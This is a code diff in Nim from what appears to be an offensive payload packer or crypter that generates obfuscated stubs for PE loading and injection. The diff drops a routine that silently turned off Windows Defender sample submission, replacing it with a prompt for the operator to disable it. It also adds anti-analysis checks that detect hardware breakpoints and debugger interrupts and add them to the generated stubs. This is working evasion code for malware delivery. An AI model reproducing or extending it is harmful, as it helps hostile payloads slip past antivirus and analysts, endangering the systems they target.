@@ -731,30 +731,12 @@ if (peload and embeddedArguments):
     verbose = true # workaround, something in DInvoke+NoVerbose breaks the arguments
 
 when system.hostOS == "windows":
-    proc isUserElevated(): bool =
-        var
-            tokenHandle: HANDLE
-            elevation = TOKEN_ELEVATION()
-            cbsize: DWORD = 0
-        
-        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, cast[PHANDLE](addr(tokenHandle))) == 0:
-            echo "DEBUG: Cannot query tokens: " & $GetLastError()
-            return false
-        
-        if GetTokenInformation(tokenHandle, tokenElevation, cast[LPVOID](addr(elevation)), cast[DWORD](sizeOf(elevation)), cast[PDWORD](addr(cbsize))) == 0:
-            echo "DEBUG: Cannot retrieve token information: " & $GetLastError()
-            discard CloseHandle(tokenHandle)
-            return false
-        
-        result = elevation.TokenIsElevated != 0
-
-when system.hostOS == "windows":
-    let isElevated = isUserElevated()
-    if (isElevated == false):
-        echo "[-] Process is not elevated, exiting. Restart the Packer as Administrator."
+    var sampleSubmissionValue = execCmdEx("powershell.exe $mpPreference = Get-MpPreference; if ($mpPreference.SubmitSamplesConsent -in 0, 1, 3) { Write-Host 'Enabled' }")
+    echo "[*] Checking Windows Defender Sample Submission..."
+    echo "[*] Windows Defender Sample Submission is: " & sampleSubmissionValue[0]
+    if (sampleSubmissionValue[0].contains("Enabled")):
+        echo "[-] Windows Defender Sample Submission is enabled. Please disable it!"
         quit(1)
-    else:
-        discard os.execShellCmd("powershell.exe $mpPreference = Get-MpPreference; if ($mpPreference.SubmitSamplesConsent -in 0, 1, 3) { Set-MpPreference -SubmitSamplesConsent 2 }")
 
 
 if (peload or peinject):
@@ -2268,12 +2250,73 @@ else:
     if(isHeapGrowable()):
         when defined(verbose):
             echo obf("[*] We don't appear to be Debugged, continuing...")
-        when defined(SkipDefaultSandBoxChecks):
-            envkey2 = envkey & "{lastFour}"
-        else:    
-            envkey2 = envkey & "{fourthtosecondlast}"
+        if(CheckHardwareBreakPoints()):
+            when defined(verbose):
+                echo obf("[*] No hardwareBreakpoints detected...")
+            if(CreatedInterrupt()):
+                when defined(verbose):
+                    echo obf("[*] No strange interrupts detected...")
+                when defined(SkipDefaultSandBoxChecks):
+                    envkey2 = envkey & "{lastFour}"
+                else:    
+                    envkey2 = envkey & "{fourthtosecondlast}"
+            else:
+                when defined(verbose):
+                    echo obf("[*] Strange Interrupt Detected, quit.")
     else:
         quit(1)
+
+"""
+
+let CheckHardwareBreakPoints * = fmt"""
+
+proc CheckHardwareBreakPoints(): bool =
+    var
+        ctx: CONTEXT
+        hThread: HANDLE
+        hwbp: DWORD
+        i: int
+        status: bool = false
+
+    hThread = GetCurrentThread()
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
+    status = GetThreadContext(hThread, addr ctx)
+
+    if (status):
+        hwbp = DWORD(ctx.Dr0) or DWORD(ctx.Dr1) or DWORD(ctx.Dr2) or DWORD(ctx.Dr3)
+        if (hwbp != 0):
+            when defined(verbose):
+                echo obf("\r\n[*] Hardware Breakpoint Detected, quit.\r\n")
+            status = false
+        else:
+            status = true
+            when defined(verbose):
+                echo obf("\r\n[*] No Hardware Breakpoints Detected, continuing...\r\n")
+    else:
+        status = false
+
+    result = status
+
+"""
+
+let CreatedInterruptStub * = """
+
+proc VEHHandler (pExceptInfo: PEXCEPTION_POINTERS): LONG {.stdcall.}=
+    #  process all exceptions, including EXCEPTION_ILLEGAL_INSTRUCTION
+    result = EXCEPTION_CONTINUE_EXECUTION
+
+proc CreatedInterrupt(): bool =
+    when defined(verbose):
+        echo obf("[*] Adding Exception Handler...")
+    AddVectoredExceptionHandler(1, VEHHandler)
+    when defined(verbose):
+        echo obf("[*] Raising exception...")
+    RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nil)
+    when defined(verbose):
+        echo obf("[*] Removing ExceptionHandler...")
+    RemoveVectoredExceptionHandler(VEHHandler)
+    return true
+    
 """
 
 var stub = Cryptstub1
@@ -2306,6 +2349,8 @@ if(pump):
 if(antidebug):
     stub.add(AntiDebugPEBStub)
     stub.add(IsDebuggerPresentStub)
+    stub.add(CheckHardwareBreakPoints)
+    stub.add(CreatedInterruptStub)
     stub.add(BeingDebugged)
 
 stub.add(getRandStubNoTab())
